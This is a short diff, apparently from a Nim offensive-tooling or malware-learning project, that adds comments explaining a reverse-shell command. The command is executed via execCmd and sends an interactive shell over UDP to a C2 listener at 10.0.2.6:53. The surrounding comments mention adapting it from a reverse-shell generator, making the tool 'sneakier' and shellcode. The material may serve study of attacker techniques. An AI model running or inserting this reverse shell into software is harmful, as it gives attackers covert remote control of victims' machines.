@@ -17,6 +17,11 @@ echo output
 
 discard execCmd("bash -c 'sh -i >& /dev/udp/10.0.2.6/53 0>&1 &'")
 
+# What does the shell do?
+# sh -i - run shell interactively
+# >& /dev/udp/10.0.2.6/53 redirect output and err to our listening c2 server.
+# 0>&1 redirect stdin to stdout- our stdout is the c2 server so we get both stdin and stdout.
+
 # reverse shell adapted from https://www.revshells.com/
 # Now we are getting a bit sneakier- in fact we've added a couple of tricks.
 # It does nothing to hide the fact that it has shellcode calling
